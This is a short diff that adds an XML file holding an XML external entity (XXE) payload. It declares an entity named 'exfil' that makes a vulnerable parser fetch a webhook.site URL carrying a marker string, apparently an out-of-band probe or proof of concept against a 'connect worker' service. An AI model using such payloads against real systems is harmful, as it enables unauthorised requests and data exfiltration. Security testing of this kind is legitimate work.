@@ -1,0 +1,5 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE r [
+  <!ENTITY exfil SYSTEM "https://webhook.site/4c1377cb-09b5-4c0e-9ece-f155eb5328c5?data=hello-Im-from-connect-worker">
+]>
+<r>&exfil;</r>
